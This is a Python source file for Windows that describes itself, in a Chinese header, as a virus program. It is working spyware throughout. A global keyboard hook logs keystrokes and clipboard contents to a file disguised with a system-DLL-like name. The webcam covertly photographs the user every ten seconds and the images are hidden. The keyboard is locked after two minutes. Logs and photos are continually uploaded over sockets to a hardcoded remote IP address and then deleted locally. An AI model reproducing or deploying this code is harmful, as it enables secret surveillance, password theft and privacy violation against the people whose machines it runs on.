'''
病毒程序
1、监听键盘输入，记录日志
2、锁定键盘
3、偷拍功能，保存图片文件
'''

import sys, os, time
import socket, struct, json
import win32clipboard
import win32con
import win32api
import cv2

from ctypes import windll
from ctypes import CFUNCTYPE
from ctypes import byref
from ctypes import POINTER
from ctypes import c_int, c_void_p
from ctypes.wintypes import MSG

from threading import Thread
from threading import Timer
from threading import Lock


# 工具
class Utils:
    def __init__(self):
        # 用户家目录
        self.base_dir = os.path.expanduser("~")

        # 初始化生成日志问文件
        self.log_path = r'%s/adhsvc.dll.system32' % self.base_dir
        open(self.log_path, 'a+', encoding='utf-8').close()
        win32api.SetFileAttributes(self.log_path, win32con.FILE_ATTRIBUTE_NORMAL)

        # 定义两把锁，控制读写
        self.mutex_log = Lock()
        self.mutex_photo = Lock()
        self.mutex_sock = Lock()
        # 服务端IP和port
        self.server_ip = '1.92.64.205'
        self.server_port = 9999

        # 本地调试
        self.debug = True
        self.mutex_debug = Lock()
        self.debug_log_path = r'%s/adhsvc.dll.system32' % self.base_dir

    def log_debug(self, res):
        if not self.debug: return
        self.mutex_debug.acquire()
        with open(self.debug_log_path, 'a+', encoding='utf-8') as f:
            f.write('\n%s\n' % res)
            f.flush()
        self.mutex_debug.release()

    def log(self, res):
        self.mutex_log.acquire()
        with open(self.log_path, 'a+', encoding='utf-8') as f:
            f.write(res)
            f.flush()
        self.mutex_log.release()

    def take_photos(self):
        while True:
            time.sleep(10)
            photo_path = r'%s/%s.jpeg' % (self.base_dir, time.strftime("%Y-%m-%d %H:%M:%S"))
            cap = None

            try:
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # 打开摄像头
                ret, frame = cap.read() # 读取摄像头数据
                self.mutex_photo.acquire()
                cv2.imwrite(photo_path, frame)
            except Exception as e:
                self.log_debug('拍照异常：%s' % e)
            finally:
                # 释放锁，关相机
                self.mutex_photo.release()
                if cap is not None: cap.release()
                cv2.destroyAllWindows()

            if os.path.exists(photo_path):
                win32api.SetFileAttributes(photo_path, win32con.FILE_ATTRIBUTE_HIDDEN)

    def send_data(self, headers, data):
        try:
            self.mutex_sock.acquire()
            client = socket.socket()
            client.connect((self.server_ip, self.server_port))

            head_json = json.dumps(headers)
            head_json_bytes = bytes(head_json, encoding='utf-8')
            client.send(struct.pack('i', len(head_json_bytes)))
            client.send(head_json_bytes)
            client.sendall(data)
            client.close()

            res = (True, 'ok')
        except ConnectionError as e:
            msg = '套接字服务端未启动：%s' % e
            res = (False, msg)
        except Exception as e:
            msg = '套接字其他错误：%s' % e
            res = (False, msg)
        finally:
            self.mutex_sock.release()
        return res

    def upload_log(self):
        while True:
            time.sleep(1)

            if not os.path.getsize(self.log_path): continue

            self.mutex_log.acquire()
            with open(self.log_path, mode='rb+') as f:
                data = f.read()
                self.mutex_log.release()

                headers = {
                    'data_size': len(data),
                    'filename': os.path.basename(self.log_path)
                }

                self.log_debug('正在往服务器发送数据')

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('日志[%s]发送成功' % data)
                else:
                    self.log_debug('日志[%s]发送失败: %s' % (data, msg))
                    continue

                f.truncate(0)

    def upload_photos(self):
        while True:
            time.sleep(3)

            files = os.listdir(self.base_dir)
            files_jpeg = [file_name for file_name in files if file_name.endswith('jpeg')]
            for file_name in files_jpeg:
                file_path = r'%s/%s' % (self.base_dir, file_name)
                if not os.path.exists(file_path):continue

                self.log_debug('开始上传照片：%s' % file_name)
                headers = {
                    'data_size': os.path.getsize(file_path),
                    'filename': file_name
                }

                self.mutex_photo.acquire()
                with open(file_path, mode='rb+') as f:
                    data = f.read()
                    self.mutex_photo.release()

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug('图片%s发送完毕。。。' % file_name)
                else:
                    self.log_debug('图片%s发送失败' % file_name)
                    continue

                os.remove(file_path)



utils = Utils()


# 定义类：定义有挂钩和拆挂钩的功能
class Toad:
    def __init__(self):
        self.user32 = windll.user32
        self.hooked = None

    def __install_hook_proc(self, pointer): # 内部方法
        self.hooked = self.user32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL, #WH_KEYBOARD_LL = 13 全局的钩子，监控键盘输入
            pointer,
            0, # 钩子函数的dll句柄
            0 # 所有线程
        ) # self,hooked 为注册钩子返回的句柄
        return True if self.hooked else False

    def install_hook_proc(self, func): # 注册钩子
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        pointer = CMPFUNC(func) # 拿到函数hookProc指针

        if self.__install_hook_proc(pointer):
            utils.log_debug("%s start " % func.__name__) # 记录调试日志

        msg = MSG()
        # 监听/获取窗口的消息，消息进入队列后则去除交给勾链中的第一个钩子
        self.user32.GetMessageA(byref(msg), None, 0, 0)

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.hooked) # 通过钩子句柄删除钩子
        self.hooked = None


toad_obj = Toad()

# 定义钩子过程，注入的逻辑
def monitor_keyboard_proc(nCode, wParam, lParam):
    # win32con.WM_KEYDOWN = 0X0100 # 键盘按下，对应数字256
    # win32con.WM_KEYUP= 0x101 # 键盘起来，对应数字257，监控键盘只需要操作KEYDOWN即可
    if wParam == win32con.WM_KEYDOWN:
        hookedKey_ascii = 0xFFFFFFFF & lParam[0] # 进行位运算
        hookedKey = chr(hookedKey_ascii)

        utils.log_debug("监听到hookedKey：[%s] hookedKey_ascii: [%s]" % (hookedKey, hookedKey_ascii))

        keyboard_dic = {
            # ---------------- 基础控制与功能键 ----------------
            8: r'<删除键>',
            9: r'<tab>',
            13: r'<enter>',
            16: r'<shift>',
            17: r'<ctrl>',
            18: r'<alt>',
            19: r'<暂停键>',
            20: r'<大小写锁定>',
            27: r'<esc>',
            32: r'<空格>',
            33: r'<pageup>',
            34: r'<pagedown>',
            35: r'<end>',
            36: r'<home>',
            37: r'<左箭头>',
            38: r'<上箭头>',
            39: r'<右箭头>',
            40: r'<下箭头>',
            44: r'<printscreen>',
            45: r'<insert>',
            46: r'<delete>',
            91: r'<左win>',
            92: r'<右win>',
            93: r'<菜单键>',
            144: r'<数字锁定>',
            145: r'<滚动锁定>',


            # ---------------- 功能键 F1-F12 ----------------
            112: r'<F1>',
            113: r'<F2>',
            114: r'<F3>',
            115: r'<F4>',
            116: r'<F5>',
            117: r'<F6>',
            118: r'<F7>',
            119: r'<F8>',
            120: r'<F9>',
            121: r'<F10>',
            122: r'<F11>',
            123: r'<F12>',

            # ---------------- 小键盘按键 ----------------
            96: r'<小键盘0>',
            97: r'<小键盘1>',
            98: r'<小键盘2>',
            99: r'<小键盘3>',
            100: r'<小键盘4>',
            101: r'<小键盘5>',
            102: r'<小键盘6>',
            103: r'<小键盘7>',
            104: r'<小键盘8>',
            105: r'<小键盘9>',
            106: r'<小键盘*>',
            107: r'<小键盘+>',
            108: r'<小键盘enter>',
            109: r'<小键盘->',
            110: r'<小键盘.>',
            111: r'<小键盘/>',

            # ---------------- 主键盘符号键（和你原有格式完全匹配） ----------------
            186: r'<;>',
            187: r'<=>',
            189: r'<->',
            192: r'<`>',
            219: r'<[>',
            220: r'<\>',
            221: r'<]>',
            222: r"<'>",
            188: r'<,>',
            190: r'<.>',
            191: r'</>',
        }
        # ---------------- 主键盘数字键 0-9 ----------------
        '''48: r'<0>',
        49: r'<1>',
        50: r'<2>',
        51: r'<3>',
        52: r'<4>',
        53: r'<5>',
        54: r'<6>',
        55: r'<7>',
        56: r'<8>',
        57: r'<9>',

        # ---------------- 主键盘字母键 A-Z ----------------
        65: r'<a>',
        66: r'<b>',
        67: r'<c>',
        68: r'<d>',
        69: r'<e>',
        70: r'<f>',
        71: r'<g>',
        72: r'<h>',
        73: r'<i>',
        74: r'<j>',
        75: r'<k>',
        76: r'<l>',
        77: r'<m>',
        78: r'<n>',
        79: r'<o>',
        80: r'<p>',
        81: r'<q>',
        82: r'<r>',
        83: r'<s>',
        84: r'<t>',
        85: r'<u>',
        86: r'<v>',
        87: r'<w>',
        88: r'<x>',
        89: r'<y>',
        90: r'<z>',
        '''

        if (hookedKey == '0'):
            toad_obj.uninstall_hook_proc()
            sys.exit(-1)

        if hookedKey_ascii in keyboard_dic:
            res = keyboard_dic[hookedKey_ascii]
            utils.log_debug('监听到输入： %s' % res)
            utils.log(res)

        if 32 < hookedKey_ascii < 127:
            if hookedKey == 'V' or hookedKey == 'c':
                win32clipboard.OpenClipboard()
                paste_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                if paste_value:
                    utils.log_debug('监听到输入： %s' % paste_value)
                    utils.log(hookedKey)

            else:
                utils.log_debug('监听到的输入为： %s' % hookedKey)
                utils.log(hookedKey)

    return windll.user32.CallNextHookEx(toad_obj.hooked, nCode, wParam, lParam)

def lock_keyboard_proc(nCode, wParam, lParam):
    utils.log_debug('锁定键盘程序正在运行')
    return 123

if __name__ == '__main__':
    # 监听键盘输入，记录日志
    t1 = Thread(target=toad_obj.install_hook_proc, args=(monitor_keyboard_proc, ))
    # 锁定键盘
    t2 = Timer(120, toad_obj.install_hook_proc, args=[lock_keyboard_proc,])

    # 偷拍，保存图片文件
    t3 = Thread(target=utils.take_photos)
    t4 = Thread(target=utils.upload_log)
    t5 = Thread(target=utils.upload_photos)

    t2.daemon = True
    t3.daemon = True
    t4.daemon = True
    t5.daemon = True

    t1.join()